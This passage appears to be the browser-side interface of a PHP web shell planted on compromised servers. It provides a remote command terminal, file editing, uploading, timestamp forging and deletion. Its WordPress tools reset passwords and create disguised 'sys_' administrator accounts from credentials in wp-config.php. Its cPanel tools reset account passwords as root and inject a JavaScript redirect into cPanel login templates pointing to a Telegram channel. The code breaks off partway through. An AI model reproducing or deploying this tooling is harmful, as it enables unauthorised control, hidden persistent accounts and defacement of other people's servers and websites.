    <div class="modal-head"><span class="title">Network</span><span class="x" onclick="hide('mNet')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" style="padding:0"><pre id="netOut" class="term-out mono" style="max-height:none;height:100%;background:#000">Loading…</pre></div>
    <div class="modal-foot"><button onclick="hide('mNet')">Close</button></div>
  </div>
</div>

<!-- search -->
<div id="mSearch" class="modal-bg hidden">
  <div class="modal wide" style="max-width: 900px;height:80vh">
    <div class="modal-head"><span class="title">Deep search</span><span class="path" id="searchPath">—</span><span class="x" onclick="hide('mSearch')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" style="gap:8px">
      <div style="display:flex;gap:6px">
        <input id="searchQ" class="mono" placeholder="filename substring…" autocomplete="off">
        <button class="primary" onclick="doSearch()">Search</button>
      </div>
      <div id="searchResults" style="flex:1;overflow:auto;font-family:ui-monospace,Menlo,monospace;font-size:12px"></div>
    </div>
  </div>
</div>

<!-- ═══ WP DETECT ═══ -->
<div id="mWpDetect" class="modal-bg hidden">
  <div class="modal" style="max-width: 720px">
    <div class="modal-head">
      <span class="title">WordPress · Detect</span>
      <span class="path" id="wpDetectPath">—</span>
      <span class="x" onclick="hide('mWpDetect')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span>
    </div>
    <div class="modal-body" id="wpDetectBody"><span class="dim">Scanning…</span></div>
    <div class="modal-foot"><button onclick="hide('mWpDetect')">Close</button></div>
  </div>
</div>

<!-- ═══ WP USERS ═══ -->
<div id="mWpUsers" class="modal-bg hidden">
  <div class="modal" style="max-width: 720px">
    <div class="modal-head">
      <span class="title">WordPress · Users</span>
      <span class="path" id="wpUsersPath">—</span>
      <span class="x" onclick="hide('mWpUsers')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span>
    </div>
    <div class="modal-body" id="wpUsersBody"><span class="dim">Loading…</span></div>
    <div class="modal-foot"><button onclick="hide('mWpUsers')">Close</button></div>
  </div>
</div>

<!-- ═══ WP RESET ═══ -->
<div id="mWpReset" class="modal-bg hidden">
  <div class="modal" style="max-width: 500px">
    <div class="modal-head"><span class="title">WordPress · Reset password</span><span class="x" onclick="hide('mWpReset')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body">
      <div class="field"><label>WP root path</label><input id="wpResetRoot" class="mono" value="<?= htmlspecialchars($t) ?>"></div>
      <div class="field"><label>Login (username or email)</label><input id="wpResetLogin" class="mono" placeholder="admin"></div>
      <div class="field"><label>New password</label><input id="wpResetPass" class="mono" value="<?= htmlspecialchars(rw_rand(16)) ?>"></div>
      <div class="dim" style="font-size:11px;line-height:1.6">
        Requires readable <span class="mono">wp-config.php</span> and MySQL access from this host.
        Updates <span class="mono">wp_users.user_pass</span> with a fresh bcrypt hash.
      </div>
    </div>
    <div class="modal-foot">
      <button onclick="hide('mWpReset')">Cancel</button>
      <button class="primary" onclick="doWpReset()">Reset</button>
    </div>
  </div>
</div>

<!-- ═══ WP CREATE ═══ -->
<div id="mWpCreate" class="modal-bg hidden">
  <div class="modal" style="max-width: 540px">
    <div class="modal-head"><span class="title">WordPress · Create account</span><span class="x" onclick="hide('mWpCreate')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body">
      <div class="field"><label>WP root path</label><input id="wpCreateRoot" class="mono" value="<?= htmlspecialchars($t) ?>"></div>
      <div class="field"><label>Username</label><input id="wpCreateUser" class="mono" value="<?= htmlspecialchars('sys_' . rw_rand(5)) ?>"></div>
      <div class="field"><label>Password</label><input id="wpCreatePass" class="mono" value="<?= htmlspecialchars(rw_rand(16)) ?>"></div>
      <div class="field"><label>Email</label><input id="wpCreateEmail" class="mono" value="<?= htmlspecialchars('sys_' . rw_rand(5) . '@example.com') ?>"></div>
      <div class="field">
        <label>Role</label>
        <select id="wpCreateRole">
          <option value="administrator" selected>administrator</option>
          <option value="editor">editor</option>
          <option value="author">author</option>
          <option value="contributor">contributor</option>
          <option value="subscriber">subscriber</option>
        </select>
      </div>
      <div class="dim" style="font-size:11px;line-height:1.6">
        Inserts a new <span class="mono">wp_users</span> row + matching <span class="mono">wp_usermeta</span> (capabilities + user_level).
      </div>
    </div>
    <div class="modal-foot">
      <button onclick="hide('mWpCreate')">Cancel</button>
      <button class="primary" onclick="doWpCreate()">Create</button>
    </div>
  </div>
</div>

<!-- ═══ CPANEL DETECT ═══ -->
<div id="mCpDetect" class="modal-bg hidden">
  <div class="modal" style="max-width: 720px">
    <div class="modal-head"><span class="title">cPanel · Detect</span><span class="x" onclick="hide('mCpDetect')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" id="cpDetectBody"><span class="dim">Scanning…</span></div>
    <div class="modal-foot"><button onclick="hide('mCpDetect')">Close</button></div>
  </div>
</div>

<!-- ═══ CPANEL ACCOUNTS ═══ -->
<div id="mCpAccounts" class="modal-bg hidden">
  <div class="modal" style="max-width: 720px">
    <div class="modal-head"><span class="title">cPanel · Accounts</span><span class="x" onclick="hide('mCpAccounts')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" id="cpAccountsBody"><span class="dim">Loading…</span></div>
    <div class="modal-foot"><button onclick="hide('mCpAccounts')">Close</button></div>
  </div>
</div>

<!-- ═══ CPANEL RESET ═══ -->
<div id="mCpReset" class="modal-bg hidden">
  <div class="modal" style="max-width: 500px">
    <div class="modal-head"><span class="title">cPanel · Reset password</span><span class="x" onclick="hide('mCpReset')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body">
      <div class="field"><label>cPanel user</label><input id="cpResetUser" class="mono" placeholder="username"></div>
      <div class="field"><label>New password</label><input id="cpResetPass" class="mono" value="<?= htmlspecialchars(rw_rand(16)) ?>"></div>
      <div class="dim" style="font-size:11px;line-height:1.6">
        Requires <b>root</b>. Uses <span class="mono">/scripts/chpass</span> or <span class="mono">whmapi1 passwd</span>.
        If shell runs as a normal user this will fail cleanly.
      </div>
    </div>
    <div class="modal-foot">
      <button onclick="hide('mCpReset')">Cancel</button>
      <button class="primary" onclick="doCpReset()">Reset</button>
    </div>
  </div>
</div>

<!-- ═══ CPANEL REDIRECT ═══ -->
<div id="mCpRedirect" class="modal-bg hidden">
  <div class="modal" style="max-width: 500px">
    <div class="modal-head"><span class="title">cPanel · Login redirect</span><span class="x" onclick="hide('mCpRedirect')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body">
      <div class="field"><label>Destination URL</label><input id="cpRedirUrl" class="mono" value="https://t.me/justbadpeople"></div>
      <div class="dim" style="font-size:11px;line-height:1.6">
        Requires <b>root</b>. Appends a JS redirect to <span class="mono">/usr/local/cpanel/base/frontend/*/login/index.tmpl</span>
        and <span class="mono">/usr/local/cpanel/base/frontend/*/login/login.tmpl</span>.
      </div>
    </div>
    <div class="modal-foot">
      <button onclick="hide('mCpRedirect')">Cancel</button>
      <button class="primary" onclick="doCpRedirect()">Deploy</button>
    </div>
  </div>
</div>

<!-- palette -->
<div id="mPal" class="modal-bg hidden">
  <div class="modal palette">
    <input id="palInput" class="palette-input" placeholder="Type a command…" autocomplete="off">
    <div id="palList" class="palette-list"></div>
  </div>
</div>

<!-- toasts -->
<div id="toasts" class="toasts"></div>

<script>
const CUR = <?= json_encode($t) ?>;
const $ = id => document.getElementById(id);
const b64 = s => btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const unb64 = s => decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/'))));

function show(id) { $(id).classList.remove('hidden'); }
function hide(id) { $(id).classList.add('hidden'); }
[
  'mEdit','mRename','mChmod','mTouch','mDel','mMk','mHash','mSys','mProcs','mNet','mSearch','mPal',
  'mWpDetect','mWpUsers','mWpReset','mWpCreate','mCpDetect','mCpAccounts','mCpReset','mCpRedirect'
].forEach(id => {
  const el = $(id);
  if (el) el.addEventListener('click', e => { if (e.target.id === id) hide(id); });
});

function toast(m, kind) {
  const w = $('toasts');
  const t = document.createElement('div');
  t.className = 'toast';
  if (kind === 'err') t.style.borderLeftColor = 'var(--red)';
  t.textContent = m;
  w.appendChild(t);
  setTimeout(() => t.remove(), 2400);
}

async function jpost(obj) {
  const body = 'j=' + b64(JSON.stringify(obj));
  const r = await fetch('?o=' + b64('j'), {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body
  });
  return await r.json();
}

/* ─── View toggle ─── */
function setView(v) {
  const g = $('gridView'), l = $('listView');
  const bg = $('vGrid'), bl = $('vList');
  if (v === 'list') {
    g.style.display = 'none'; l.style.display = 'block';
    bg.classList.remove('on'); bl.classList.add('on');
  } else {
    g.style.display = 'block'; l.style.display = 'none';
    bl.classList.remove('on'); bg.classList.add('on');
  }
  try { localStorage.setItem('d4rk_v', v); } catch(e) {}
}
try { const sv = localStorage.getItem('d4rk_v'); if (sv) setView(sv); } catch(e) {}

/* ─── Filter ─── */
function applyFilter(q) {
  q = (q || '').toLowerCase();
  document.querySelectorAll('[data-name]').forEach(el => {
    el.style.display = (!q || el.dataset.name.includes(q)) ? '' : 'none';
  });
}

/* ─── Upload ─── */
function uploadFiles(files) {
  if (!files || !files.length) return;
  const fd = new FormData();
  for (const f of files) fd.append('f[]', f);
  fetch('?p=' + b64(CUR), { method: 'POST', body: fd })
    .then(() => location.reload());
}

/* ─── Edit ─── */
let editPath = '';
async function openEdit(p) {
  editPath = p;
  $('editPath').textContent = p;
  $('editBody').value = '';
  $('editMeta').textContent = 'loading…';
  show('mEdit');
  const r = await jpost({act: 'read', path: p});
  if (r.ok) {
    $('editBody').value = r.c || '';
    $('editMeta').textContent = (r.c || '').length + ' chars · ' + (r.size || 0) + ' bytes';
  } else {
    $('editMeta').textContent = 'load failed';
  }
}
async function saveEdit() {
  const r = await jpost({act: 'write', path: editPath, x: $('editBody').value});
  if (r.ok) { toast('saved'); hide('mEdit'); setTimeout(() => location.reload(), 200); }
  else toast('save failed', 'err');
}

/* ─── Rename ─── */
let renPath = '';
function openRename(p, n) {
  renPath = p;
  $('renameVal').value = n;
  show('mRename');
  setTimeout(() => { $('renameVal').focus(); $('renameVal').select(); }, 40);
}
async function doRename() {
  const n = $('renameVal').value.trim();
  if (!n) return;
  const r = await jpost({act: 'rename', path: renPath, x: n});
  if (r.ok) { hide('mRename'); location.reload(); }
  else toast('rename failed', 'err');
}

/* ─── Chmod ─── */
let chPath = '';
function openChmod(p, m) {
  chPath = p;
  $('chmodVal').value = m;
  show('mChmod');
  setTimeout(() => $('chmodVal').focus(), 40);
}
async function doChmod() {
  const m = $('chmodVal').value.trim();
  if (!m) return;
  const r = await jpost({act: 'chmod', path: chPath, x: m});
  if (r.ok) { hide('mChmod'); location.reload(); }
  else toast('chmod failed', 'err');
}

/* ─── Touch ─── */
let tcPath = '';
function openTouch(p, ts) {
  tcPath = p;
  const d = new Date(ts * 1000);
  const pad = n => String(n).padStart(2, '0');
  $('touchVal').value = d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate()) + 'T' + pad(d.getHours()) + ':' + pad(d.getMinutes());
  show('mTouch');
}
async function doTouch() {
  const v = $('touchVal').value;
  if (!v) return;
  const ts = Math.floor(new Date(v).getTime() / 1000);
  const r = await jpost({act: 'touch', path: tcPath, x: ts});
  if (r.ok) { hide('mTouch'); location.reload(); }
  else toast('touch failed', 'err');
}

/* ─── Delete ─── */
let delPath = '';
function askDel(p, n, isd) {
  delPath = p;
  $('delMsg').textContent = 'Permanently delete "' + n + '"?';
  $('delRecWrap').style.display = isd ? 'flex' : 'none';
  $('delRec').checked = false;
  show('mDel');
}
async function doDel() {
  const r = await jpost({act: 'delete', path: delPath, rec: $('delRec').checked});
  if (r.ok) { hide('mDel'); location.reload(); }
  else toast('delete failed', 'err');
}

/* ─── Mk ─── */
let mkKind = 'dir';
function openMk(k) {
  mkKind = k;
  $('mkTitle').textContent = k === 'dir' ? 'New folder' : 'New file';
  $('mkVal').value = '';
  show('mMk');
  setTimeout(() => $('mkVal').focus(), 40);
}
async function doMk() {
  const n = $('mkVal').value.trim();
  if (!n) return;
  const r = await jpost({act: mkKind === 'dir' ? 'mkdir' : 'mkfile', path: n});
  if (r.ok) { hide('mMk'); location.reload(); }
  else toast('create failed', 'err');
}

/* ─── Hash ─── */
async function openHash(p) {
  $('hashPath').textContent = p;
  $('hashBody').innerHTML = '<span class="dim">Loading…</span>';
  show('mHash');
  const r = await jpost({act: 'hash', path: p});
  if (!r.ok) { $('hashBody').innerHTML = '<span class="red">Hash failed</span>'; return; }
  $('hashBody').innerHTML = `
    <div class="hash-row"><div class="k">Size</div><div class="v">${r.size} bytes</div></div>
    <div class="hash-row"><div class="k">MD5</div><div class="v">${r.md5 || '—'}</div></div>
    <div class="hash-row"><div class="k">SHA1</div><div class="v">${r.sha1 || '—'}</div></div>
    <div class="hash-row"><div class="k">SHA256</div><div class="v">${r.sha256 || '—'}</div></div>
  `;
}

/* ─── Bulk ─── */
function bulkZip() {
  const s = Array.from(document.querySelectorAll('.rowck:checked')).map(c => unb64(c.value));
  if (!s.length) return toast('none selected', 'err');
  jpost({act: 'zip', srcs: s}).then(r => { if (r.ok) location.reload(); else toast('zip failed', 'err'); });
}
function bulkClip(op) {
  const s = Array.from(document.querySelectorAll('.rowck:checked')).map(c => unb64(c.value));
  if (!s.length) return toast('none selected', 'err');
  jpost({act: 'clip', path: s[0], x: op}).then(() => location.reload());
}
function doPaste() {
  jpost({act: 'paste'}).then(r => { if (r.ok) location.reload(); else toast('paste failed', 'err'); });
}

/* ─── Terminal ─── */
const out = $('out');
function appendTerm(html) { out.innerHTML += html; out.scrollTop = out.scrollHeight; }
async function execCmd() {
  const c = $('cmd').value.trim();
  if (!c) return;
  $('cmd').value = '';
  appendTerm('\n<span class="t-cmd">$ ' + escapeHtml(c) + '</span>\n');
  try {
    const r = await fetch('?o=' + b64('x'), {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'd=' + b64(c)
    });
    const text = await r.text();
    appendTerm(escapeHtml(text || '(no output)'));
  } catch (e) {
    appendTerm('<span class="t-err">[!] request failed</span>');
  }
}
function sendCmd(c) { $('cmd').value = c; execCmd(); }
function escapeHtml(s) { return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]); }

/* ─── Sysinfo ─── */
async function openSysInfo() {
  $('sysBody').innerHTML = '<span class="dim">Loading…</span>';
  show('mSys');
  const r = await jpost({act: 'sysinfo'});
  if (!r.ok) { $('sysBody').innerHTML = '<span class="red">Failed</span>'; return; }
  const i = r.info;
  $('sysBody').innerHTML = `
    <div class="info-grid">
      <div class="k">Host</div><div class="v">${escapeHtml(i.host)}</div>
      <div class="k">Uname</div><div class="v">${escapeHtml(i.uname)}</div>
      <div class="k">User</div><div class="v">${escapeHtml(i.user)}</div>
      <div class="k">PHP</div><div class="v">${escapeHtml(i.php)}</div>
      <div class="k">Server</div><div class="v">${escapeHtml(i.server)}</div>
      <div class="k">CWD</div><div class="v">${escapeHtml(i.cwd)}</div>
      <div class="k">Disk</div><div class="v">${escapeHtml(i.disk)}</div>
      <div class="k">Load</div><div class="v">${escapeHtml(i.load)}</div>
      <div class="k">Memory</div><div class="v">${escapeHtml(i.memory)}</div>
      <div class="k">Disabled</div><div class="v">${escapeHtml(i.disabled)}</div>
    </div>
  `;
}

/* ─── Procs ─── */
async function openProcs() {
  $('procsOut').textContent = 'Loading…';
  show('mProcs');
  const r = await jpost({act: 'procs'});
  $('procsOut').textContent = r.out || 'ps unavailable';
}

/* ─── Net ─── */
async function openNet() {
  $('netOut').textContent = 'Loading…';
  show('mNet');
  const r = await jpost({act: 'net'});
  $('netOut').textContent = r.out || 'ss/netstat unavailable';
}

/* ─── Deep search ─── */
function openSearch() {
  $('searchPath').textContent = CUR;
  $('searchQ').value = '';
  $('searchResults').innerHTML = '<span class="dim">Enter a filename substring and press Search.</span>';
  show('mSearch');
  setTimeout(() => $('searchQ').focus(), 40);
}
async function doSearch() {
  const q = $('searchQ').value.trim();
  if (!q) return;
  $('searchResults').innerHTML = '<span class="dim">Searching…</span>';
  const r = await jpost({act: 'search', path: CUR, x: q});
  if (!r.ok) { $('searchResults').innerHTML = '<span class="red">Search failed</span>'; return; }
  if (!r.hits.length) { $('searchResults').innerHTML = '<span class="dim">No matches.</span>'; return; }
  $('searchResults').innerHTML = r.hits.map(h => `
    <div style="padding:6px 0;border-bottom:1px solid var(--line)">
      <a href="?p=${b64(h.dir)}" style="color:var(--fg)">${escapeHtml(h.name)}</a>
      <div class="dim" style="font-size:10px">${escapeHtml(h.path)}</div>
    </div>
  `).join('');
}

/* ═══ WordPress ═══ */
function wpRootDefault() {
  return CUR;
}
function scanRow(k, v, cls) {
  return `<div class="scan-row"><div class="k">${escapeHtml(k)}</div><div class="v ${cls || ''}">${escapeHtml(String(v))}</div></div>`;
}
async function openWpDetect() {
  $('wpDetectBody').innerHTML = '<span class="dim">Scanning…</span>';
  show('mWpDetect');
  const r = await jpost({act: 'wp_detect', path: CUR});
  if (!r.ok) { $('wpDetectBody').innerHTML = '<span class="red">Scan failed</span>'; return; }
  const d = r.data;
  let html = '';
  html += scanRow('Found', d.found ? 'YES · ' + d.count + ' sign(s)' : 'NO', d.found ? 'ok' : 'bad');
  for (const s of d.signs) html += scanRow(s.name, s.path + (s.extra ? ' · ' + s.extra : ''), 'ok');
  for (const m of d.missing) html += scanRow(m, '—', 'bad');
  if (d.versions && Object.keys(d.versions).length) {
    html += '<div style="margin-top:10px;font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--fg-faint)">Detected versions</div>';
    for (const [k, v] of Object.entries(d.versions)) html += scanRow(k, v, 'ok');
  }
  html += '<div style="margin-top:12px;font-size:11px;line-height:1.6;color:var(--fg-dim)">' +
    (d.wpcfg_readable ? '<span class="green">wp-config.php is readable</span> — reset / create account will work.' :
     '<span class="warn">wp-config.php is NOT readable</span> — reset / create will fail unless perms change.') +
    '</div>';
  $('wpDetectBody').innerHTML = html;
}

async function openWpUsers() {
  $('wpUsersPath').textContent = CUR;
  $('wpUsersBody').innerHTML = '<span class="dim">Loading…</span>';
  show('mWpUsers');
  const r = await jpost({act: 'wp_users', path: CUR});
  if (!r.ok) {
    $('wpUsersBody').innerHTML = `<div class="red">${escapeHtml(r.e || 'failed')}</div>`;
    return;
  }
  if (!r.users || !r.users.length) {
    $('wpUsersBody').innerHTML = '<span class="dim">No users returned.</span>';
    return;
  }
  let html = `<div class="dim" style="font-size:11px;margin-bottom:8px">${r.users.length} user(s) · prefix <span class="mono">${escapeHtml(r.prefix)}</span></div>`;
  for (const u of r.users) {
    html += `<div class="wp-user-row">
      <span class="login">${escapeHtml(u.user_login)}</span>
      <span class="email">${escapeHtml(u.user_email || '—')}</span>
      <span class="role">${escapeHtml(u.role || '—')}</span>
      <button onclick="quickReset('${escapeHtml(u.user_login).replace(/'/g,'&#39;')}')">reset</button>
    </div>`;
  }
  $('wpUsersBody').innerHTML = html;
}

function quickReset(login) {
  $('wpResetRoot').value = CUR;
  $('wpResetLogin').value = login;
  hide('mWpUsers');
  show('mWpReset');
}

function openWpReset() {
  $('wpResetRoot').value = CUR;
  $('wpResetLogin').value = 'admin';
  show('mWpReset');
}
async function doWpReset() {
  const root = $('wpResetRoot').value.trim();
  const login = $('wpResetLogin').value.trim();
  const pass = $('wpResetPass').value;
  if (!root || !login || !pass) return toast('missing fields', 'err');
  const r = await jpost({act: 'wp_reset', path: root, x: login, pass});
  if (r.ok) { toast('password updated · ' + (r.user || '')); hide('mWpReset'); }
  else toast('reset failed · ' + (r.e || ''), 'err');
}

function openWpCreate() {
  $('wpCreateRoot').value = CUR;
  show('mWpCreate');
}
async function doWpCreate() {
  const root = $('wpCreateRoot').value.trim();
  const u = $('wpCreateUser').value.trim();
  const p = $('wpCreatePass').value;
  const e = $('wpCreateEmail').value.trim();
  const role = $('wpCreateRole').value;
  if (!root || !u || !p || !e) return toast('missing fields', 'err');
  const r = await jpost({act: 'wp_create', path: root, user: u, pass: p, email: e, role});
  if (r.ok) { toast('user created · ' + u); hide('mWpCreate'); }
  else toast('create failed · ' + (r.e || ''), 'err');
}

/* ═══ cPanel ═══ */
async function openCpDetect() {
  $('cpDetectBody').innerHTML = '<span class="dim">Scanning…</span>';
  show('mCpDetect');
  const r = await jpost({act: 'cp_detect'});
  if (!r.ok) { $('cpDetectBody').innerHTML = '<span class="red">Scan failed</span>'; return; }
  const d = r.data;
  let html = '';
  html += scanRow('Found', d.found ? 'YES · ' + d.count + ' sign(s)' : 'NO', d.found ? 'ok' : 'bad');
  html += scanRow('Privilege', d.is_root ? 'root' : 'user (' + d.whoami + ')', d.is_root ? 'ok' : 'warn');
  for (const s of d.signs) html += scanRow(s.name, s.path, 'ok');
  if (d.versions && Object.keys(d.versions).length) {
    html += '<div style="margin-top:10px;font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--fg-faint)">Detected versions</div>';
    for (const [k, v] of Object.entries(d.versions)) html += scanRow(k, v, 'ok');
  }
  html += '<div style="margin-top:12px;font-size:11px;line-height:1.6;color:var(--fg-dim)">' +
    (d.is_root ?
      '<span class="green">Running as root</span> — reset password and login redirect will work.' :
      '<span class="warn">Not running as root</span> — reset/redirect will fail unless this shell is root.') +
    '</div>';
  $('cpDetectBody').innerHTML = html;
}

async function openCpAccounts() {
  $('cpAccountsBody').innerHTML = '<span class="dim">Loading…</span>';
  show('mCpAccounts');
  const r = await jpost({act: 'cp_accounts'});
  if (!r.ok) {
    $('cpAccountsBody').innerHTML = `<div class="red">${escapeHtml(r.e || 'failed')}</div>`;
    return;
  }
  if (!r.accounts || !r.accounts.length) {
    $('cpAccountsBody').innerHTML = '<span class="dim">No accounts readable.</span>';
    return;
  }
  let html = `<div class="dim" style="font-size:11px;margin-bottom:8px">${r.accounts.length} account(s)</div>`;
  for (const a of r.accounts) {
    html += `<div class="wp-user-row">
      <span class="login">${escapeHtml(a.user)}</span>
      <span class="email">${escapeHtml(a.email || '—')}</span>
      <span class="role">${escapeHtml(a.domain || '—')}</span>
      <button onclick="quickCpReset('${escapeHtml(a.user).replace(/'/g,'&#39;')}')">reset</button>
    </div>`;
  }
  $('cpAccountsBody').innerHTML = html;
}

function quickCpReset(user) {
  $('cpResetUser').value = user;
  hide('mCpAccounts');
  show('mCpReset');
}

function openCpReset() {
  show('mCpReset');
}
async function doCpReset() {
  const user = $('cpResetUser').value.trim();
  const pass = $('cpResetPass').value;
  if (!user || !pass) return toast('missing fields', 'err');
  const r = await jpost({act: 'cp_reset', x: user, pass});
  if (r.ok) { toast('cPanel password changed · ' + user); hide('mCpReset'); }
  else toast('reset failed · ' + (r.e || ''), 'err');
}

function openCpRedirect() {
  show('mCpRedirect');
}
async function doCpRedirect() {
  const url = $('cpRedirUrl').value.trim();
  if (!url) return toast('missing URL', 'err');
  const r = await jpost({act: 'cp_redirect', x: url});
  if (r.ok) { toast('redirect deployed · ' + (r.count || 0) + ' template(s)'); hide('mCpRedirect'); }
  else toast('deploy failed · ' + (r.e || ''), 'err');
}

/* ─── Palette ─── */
const PAL = [
  { l: 'Terminal: id',           i: 'chevron-right', f: () => sendCmd('id') },
  { l: 'Terminal: whoami',       i: 'chevron-right', f: () => sendCmd('whoami') },
  { l: 'Terminal: uname -a',     i: 'chevron-right', f: () => sendCmd('uname -a') },
  { l: 'Terminal: ls -la',       i: 'chevron-right', f: () => sendCmd('ls -la') },
  { l: 'Terminal: ps aux',       i: 'chevron-right', f: () => sendCmd('ps aux') },
  { l: 'Terminal: netstat',      i: 'chevron-right', f: () => sendCmd('ss -tulpn 2>/dev/null || netstat -tulpn') },
  { l: 'Terminal: df -h',        i: 'chevron-right', f: () => sendCmd('df -h') },
  { l: 'Terminal: free -h',      i: 'chevron-right', f: () => sendCmd('free -h') },
  { l: 'Terminal: env',          i: 'chevron-right', f: () => sendCmd('env') },
  { l: 'Create: New folder',     i: 'folder',        f: () => openMk('dir') },
  { l: 'Create: New file',       i: 'file',          f: () => openMk('file') },
  { l: 'View: System info',      i: 'cpu',           f: () => openSysInfo() },
  { l: 'View: Processes',        i: 'activity',      f: () => openProcs() },
  { l: 'View: Network',          i: 'wifi',          f: () => openNet() },
  { l: 'View: Deep search',      i: 'search',        f: () => openSearch() },
  { l: 'WP: Detect',             i: 'search',        f: () => openWpDetect() },
  { l: 'WP: List admins',        i: 'users',         f: () => openWpUsers() },
  { l: 'WP: Reset password',     i: 'key',           f: () => openWpReset() },
  { l: 'WP: Create account',     i: 'user-plus',     f: () => openWpCreate() },
  { l: 'cPanel: Detect',         i: 'search',        f: () => openCpDetect() },
  { l: 'cPanel: List accounts',  i: 'users',         f: () => openCpAccounts() },
  { l: 'cPanel: Reset password', i: 'key',           f: () => openCpReset() },
  { l: 'cPanel: Login redirect', i: 'external-link', f: () => openCpRedirect() },
  { l: 'Layout: Grid',           i: 'layout-grid',   f: () => setView('grid') },
  { l: 'Layout: List',           i: 'layout-list',   f: () => setView('list') },
  { l: 'Navigate: /',            i: 'hard-drive',    f: () => location.href = '?p=' + b64('/') },
  { l: 'Navigate: /tmp',         i: 'archive',       f: () => location.href = '?p=' + b64('/tmp') },
  { l: 'Navigate: /etc',         i: 'settings',      f: () => location.href = '?p=' + b64('/etc') },
  { l: 'Navigate: /var/www',     i: 'globe',         f: () => location.href = '?p=' + b64('/var/www') },
];
let palSel = 0, palFiltered = PAL.slice();

function paletteIcon(name) {
  const icons = {
    'chevron-right': '<polyline points="9 18 15 12 9 6"/>',
    'folder': '<path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>',
    'file': '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/>',
    'cpu': '<rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/>',
    'activity': '<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>',
    'wifi': '<path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/>',
    'search': '<circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>',
    'users': '<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>',
    'user-plus': '<path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/>',
    'key': '<path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>',
    'external-link': '<path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>',
    'layout-grid': '<rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/>',
    'layout-list': '<line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/>',
